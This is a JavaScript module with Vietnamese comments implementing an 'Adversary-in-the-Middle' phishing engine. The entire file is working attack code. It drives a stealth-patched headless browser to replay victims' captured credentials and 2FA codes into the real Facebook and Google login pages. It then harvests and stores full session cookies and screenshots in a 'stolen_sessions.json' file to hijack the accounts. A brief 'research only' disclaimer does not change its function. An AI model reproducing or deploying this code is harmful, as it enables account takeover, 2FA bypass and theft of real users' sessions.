/**
 * AiTM (Adversary-in-the-Middle) Engine
 * 
 * Sử dụng Puppeteer để chuyển tiếp credentials real-time
 * vào trang web thật, bypass 2FA, và đánh cắp session cookie.
 * 
 * ⚠️  CHỈ DÙNG CHO NGHIÊN CỨU TRÊN TÀI KHOẢN CÁ NHÂN!
 */

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const fs = require('fs');
const path = require('path');

// Stolen sessions storage
const SESSIONS_FILE = path.join(__dirname, '..', 'stolen_sessions.json');

class AiTMEngine {
    constructor() {
        this.activeSessions = new Map();
        this.loadSessions();
    }

    loadSessions() {
        try {
            if (fs.existsSync(SESSIONS_FILE)) {
                this.stolenSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
            } else {
                this.stolenSessions = [];
            }
        } catch(e) {
            this.stolenSessions = [];
        }
    }

    saveSessions() {
        try {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(this.stolenSessions, null, 2));
        } catch(e) {
            console.error('[AiTM] Failed to save sessions:', e.message);
        }
    }

    // ===== TARGET CONFIGURATIONS =====
    static TARGETS = {
        facebook: {
            name: 'Facebook',
            loginUrl: 'https://www.facebook.com/login',
            selectors: {
                email: '#email',
                password: '#pass',
                loginBtn: 'button[name="login"], #loginbutton',
                otpInput: 'input[name="approvals_code"]',
                otpSubmit: '#checkpointSubmitButton, button[type="submit"]',
                errorMsg: '#error_box, ._9ay7',
                rememberBrowser: 'input[name="name_action_selected"]',
                rememberSubmit: '#checkpointSubmitButton'
            },
            cookieNames: ['c_user', 'xs', 'datr', 'fr', 'sb'],
            checks: {
                is2FA: (url) => url.includes('checkpoint') || url.includes('two_step_verification'),
                isError: (url) => url.includes('login') && !url.includes('checkpoint'),
                isSuccess: (url) => !url.includes('login') && !url.includes('checkpoint') && !url.includes('recover')
            }
        },
        google: {
            name: 'Google',
            loginUrl: 'https://accounts.google.com/signin/v2/identifier',
            selectors: {
                email: 'input[type="email"]',
                emailNext: '#identifierNext button',
                password: 'input[type="password"]',
                passwordNext: '#passwordNext button',
                otpInput: 'input[type="tel"]',
                otpNext: '#idvPreregisteredPhoneNext button, button[jsname="LgbsSe"]'
            },
            cookieNames: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', '__Secure-1PSID'],
            checks: {
                is2FA: (url) => url.includes('challenge') || url.includes('signin/v2/challenge'),
                isError: (url, content) => (content && content.includes('Couldn')) || (content && content.includes('Wrong')),
                isSuccess: (url) => url.includes('myaccount') || url.includes('mail.google') || url.includes('gds.google')
            }
        }
    };

    // ===== LAUNCH BROWSER =====
    async createSession(target = 'facebook') {
        const config = AiTMEngine.TARGETS[target];
        if (!config) throw new Error(`Unknown target: ${target}`);

        const sessionId = 'aitm_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);

        console.log(`\n🔴 [AiTM] Session ${sessionId} — Khởi tạo browser cho ${config.name}...`);

        const browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--disable-infobars',
                '--window-size=1366,768'
            ]
        });

        const page = await browser.newPage();

        // Stealth patches
        await page.setViewport({ width: 1366, height: 768 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');

        // Override navigator.webdriver
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['vi-VN', 'vi', 'en-US', 'en'] });
            window.chrome = { runtime: {} };
        });

        const session = {
            id: sessionId,
            browser,
            page,
            target,
            config,
            state: 'initialized',
            email: '',
            cookies: [],
            createdAt: new Date().toISOString(),
            log: []
        };

        this.activeSessions.set(sessionId, session);
        this._log(sessionId, 'Session created');

        // Auto-close sau 5 phút để tránh memory leak
        setTimeout(() => {
            if (this.activeSessions.has(sessionId)) {
                this._log(sessionId, '⏰ Auto-closing session (timeout)');
                this.closeSession(sessionId);
            }
        }, 5 * 60 * 1000);

        return sessionId;
    }

    // ===== FACEBOOK LOGIN =====
    async loginFacebook(sessionId, email, password) {
        const session = this.activeSessions.get(sessionId);
        if (!session) throw new Error('Session not found');

        const { page, config } = session;
        session.email = email;
        session.state = 'navigating';
        this._log(sessionId, `Navigating to ${config.loginUrl}`);

        try {
            // Navigate to login page
            await page.goto(config.loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
            await this._randomDelay(500, 1500);

            session.state = 'typing_credentials';
            this._log(sessionId, `Typing email: ${email}`);

            // Type email with human-like delay
            await page.waitForSelector(config.selectors.email, { timeout: 10000 });
            await page.click(config.selectors.email);
            await this._randomDelay(200, 500);
            await page.type(config.selectors.email, email, { delay: 30 + Math.random() * 80 });
            await this._randomDelay(300, 800);

            // Type password
            this._log(sessionId, 'Typing password...');
            await page.click(config.selectors.password);
            await this._randomDelay(200, 400);
            await page.type(config.selectors.password, password, { delay: 30 + Math.random() * 80 });
            await this._randomDelay(500, 1200);

            // Click login
            session.state = 'submitting';
            this._log(sessionId, 'Clicking login button...');
            await page.click(config.selectors.loginBtn);

            // Wait for navigation
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});
            await this._randomDelay(1000, 2000);

            // Analyze result
            const currentUrl = page.url();
            const pageContent = await page.content().catch(() => '');
            this._log(sessionId, `Post-login URL: ${currentUrl}`);

            // Check: 2FA required?
            if (config.checks.is2FA(currentUrl)) {
                session.state = '2fa_required';
                this._log(sessionId, '🔐 2FA DETECTED — Cần OTP!');
                return {
                    status: '2fa_required',
                    sessionId,
                    message: 'Tài khoản yêu cầu xác thực 2 bước'
                };
            }

            // Check: Login error?
            if (config.checks.isError(currentUrl)) {
                // Check for specific error messages
                const hasError = await page.$(config.selectors.errorMsg).catch(() => null);
                session.state = 'login_failed';
                this._log(sessionId, '❌ Login thất bại — sai credentials');
                return {
                    status: 'invalid_credentials',
                    sessionId,
                    message: hasError ? 'Mật khẩu không đúng' : 'Đăng nhập thất bại'
                };
            }

            // Check: Success!
            if (config.checks.isSuccess(currentUrl)) {
                return await this._captureSuccess(sessionId);
            }

            // Unknown state
            session.state = 'unknown';
            this._log(sessionId, `⚠️ Unknown state: ${currentUrl}`);
            return { status: 'unknown', sessionId, url: currentUrl };

        } catch (error) {
            session.state = 'error';
            this._log(sessionId, `💥 Error: ${error.message}`);
            return { status: 'error', sessionId, message: error.message };
        }
    }

    // ===== GOOGLE LOGIN =====
    async loginGoogle(sessionId, email, password) {
        const session = this.activeSessions.get(sessionId);
        if (!session) throw new Error('Session not found');

        const { page, config } = session;
        session.email = email;
        session.state = 'navigating';
        this._log(sessionId, `Navigating to ${config.loginUrl}`);

        try {
            await page.goto(config.loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
            await this._randomDelay(800, 2000);

            // Step 1: Email
            session.state = 'typing_email';
            this._log(sessionId, `Typing email: ${email}`);
            await page.waitForSelector(config.selectors.email, { timeout: 10000 });
            await page.type(config.selectors.email, email, { delay: 40 + Math.random() * 60 });
            await this._randomDelay(500, 1000);
            await page.click(config.selectors.emailNext);
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});
            await this._randomDelay(1000, 2000);

            // Step 2: Password
            session.state = 'typing_password';
            this._log(sessionId, 'Typing password...');
            await page.waitForSelector(config.selectors.password, { timeout: 10000, visible: true });
            await this._randomDelay(500, 1000);
            await page.type(config.selectors.password, password, { delay: 40 + Math.random() * 60 });
            await this._randomDelay(500, 1200);
            await page.click(config.selectors.passwordNext);
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});
            await this._randomDelay(1500, 3000);

            const currentUrl = page.url();
            this._log(sessionId, `Post-login URL: ${currentUrl}`);

            if (config.checks.is2FA(currentUrl)) {
                session.state = '2fa_required';
                this._log(sessionId, '🔐 2FA DETECTED');
                return { status: '2fa_required', sessionId, message: 'Google 2FA required' };
            }

            if (config.checks.isSuccess(currentUrl)) {
                return await this._captureSuccess(sessionId);
            }

            session.state = 'login_failed';
            this._log(sessionId, '❌ Login failed');
            return { status: 'invalid_credentials', sessionId, message: 'Sai thông tin đăng nhập' };

        } catch (error) {
            session.state = 'error';
            this._log(sessionId, `💥 Error: ${error.message}`);
            return { status: 'error', sessionId, message: error.message };
        }
    }

    // ===== SUBMIT 2FA OTP =====
    async submit2FA(sessionId, otp) {
        const session = this.activeSessions.get(sessionId);
        if (!session) throw new Error('Session not found');

        const { page, config, target } = session;
        session.state = 'submitting_2fa';
        this._log(sessionId, `Submitting 2FA OTP: ${otp}`);

        try {
            if (target === 'facebook') {
                await page.waitForSelector(config.selectors.otpInput, { timeout: 10000 });
                await page.type(config.selectors.otpInput, otp, { delay: 60 + Math.random() * 80 });
                await this._randomDelay(500, 1000);
                await page.click(config.selectors.otpSubmit);
            } else if (target === 'google') {
                await page.waitForSelector(config.selectors.otpInput, { timeout: 10000, visible: true });
                await page.type(config.selectors.otpInput, otp, { delay: 60 + Math.random() * 80 });
                await this._randomDelay(500, 1000);
                await page.click(config.selectors.otpNext);
            }

            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});
            await this._randomDelay(2000, 3000);

            const currentUrl = page.url();
            this._log(sessionId, `Post-2FA URL: ${currentUrl}`);

            // Facebook: Sometimes asks "Save browser?"
            if (target === 'facebook' && currentUrl.includes('checkpoint')) {
                try {
                    // Try to click "Continue" / skip save browser
                    const continueBtn = await page.$(config.selectors.rememberSubmit);
                    if (continueBtn) {
                        await continueBtn.click();
                        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
                        await this._randomDelay(1000, 2000);
                    }
                } catch(e) {}
            }

            // Check if 2FA succeeded
            const finalUrl = page.url();
            if (config.checks.is2FA && config.checks.is2FA(finalUrl)) {
                session.state = '2fa_failed';
                this._log(sessionId, '❌ 2FA OTP sai');
                return { status: 'invalid_otp', sessionId, message: 'Mã OTP không đúng' };
            }

            // Success!
            return await this._captureSuccess(sessionId);

        } catch (error) {
            session.state = 'error';
            this._log(sessionId, `💥 2FA Error: ${error.message}`);
            return { status: 'error', sessionId, message: error.message };
        }
    }

    // ===== CAPTURE SESSION COOKIES =====
    async _captureSuccess(sessionId) {
        const session = this.activeSessions.get(sessionId);
        const { page, config, target } = session;

        session.state = 'capturing_cookies';
        this._log(sessionId, '🍪 CAPTURING SESSION COOKIES...');

        // Get ALL cookies from target domain
        const allCookies = await page.cookies('https://www.facebook.com', 'https://www.google.com', 'https://accounts.google.com');

        // Filter important cookies
        const importantCookies = allCookies.filter(c =>
            config.cookieNames.some(name => c.name === name || c.name.includes(name))
        );

        // Take screenshot as proof
        let screenshot = null;
        try {
            screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 60 });
        } catch(e) {}

        session.state = 'authenticated';
        session.cookies = allCookies;

        // Save to stolen sessions
        const stolenEntry = {
            session_id: sessionId,
            target: target,
            target_name: config.name,
            email: session.email,
            captured_at: new Date().toISOString(),
            status: 'active',
            cookies_count: allCookies.length,
            important_cookies: importantCookies.map(c => ({
                name: c.name,
                value: c.value.substring(0, 20) + '...',
                domain: c.domain,
                expires: c.expires ? new Date(c.expires * 1000).toISOString() : 'session'
            })),
            full_cookies: allCookies,
            screenshot: screenshot ? `data:image/jpeg;base64,${screenshot}` : null,
            final_url: page.url()
        };

        this.stolenSessions.push(stolenEntry);
        this.saveSessions();

        this._log(sessionId, `✅ SESSION HIJACKED! ${allCookies.length} cookies captured (${importantCookies.length} critical)`);

        // Print critical cookies to console
        console.log('\n' + '🔴'.repeat(30));
        console.log('🍪 SESSION COOKIES CAPTURED — ' + config.name.toUpperCase());
        console.log('📧 Email: ' + session.email);
        importantCookies.forEach(c => {
            console.log(`   ${c.name}: ${c.value.substring(0, 30)}...`);
        });
        console.log('🔴'.repeat(30) + '\n');

        return {
            status: 'success',
            sessionId,
            message: `Session hijacked! ${allCookies.length} cookies captured`,
            cookies_count: allCookies.length,
            critical_cookies: importantCookies.length,
            email: session.email,
            target: config.name
        };
    }

    // ===== UTILITIES =====
    async _randomDelay(min, max) {
        const delay = min + Math.random() * (max - min);
        return new Promise(r => setTimeout(r, delay));
    }

    _log(sessionId, message) {
        const session = this.activeSessions.get(sessionId);
        if (session) {
            const entry = { time: new Date().toISOString(), message };
            session.log.push(entry);
            console.log(`[AiTM:${sessionId.slice(-6)}] ${message}`);
        }
    }

    // ===== SESSION MANAGEMENT =====
    getSessionState(sessionId) {
        const session = this.activeSessions.get(sessionId);
        if (!session) return null;
        return {
            id: session.id,
            state: session.state,
            target: session.target,
            email: session.email,
            log: session.log,
            cookies_count: session.cookies.length
        };
    }

    getStolenSessions() {
        return this.stolenSessions.map(s => ({
            session_id: s.session_id,
            target: s.target_name,
            email: s.email,
            captured_at: s.captured_at,
            status: s.status,
            cookies_count: s.cookies_count,
            critical_cookies: s.important_cookies ? s.important_cookies.length : 0,
            has_screenshot: !!s.screenshot
        }));
    }

    getFullSession(sessionId) {
        return this.stolenSessions.find(s => s.session_id === sessionId) || null;
    }

    async closeSession(sessionId) {
        const session = this.activeSessions.get(sessionId);
        if (session) {
            try { await session.browser.close(); } catch(e) {}
            this.activeSessions.delete(sessionId);
            this._log(sessionId, 'Session closed');
        }
    }

    async closeAll() {
        for (const [id] of this.activeSessions) {
            await this.closeSession(id);
        }
    }
}

module.exports = AiTMEngine;
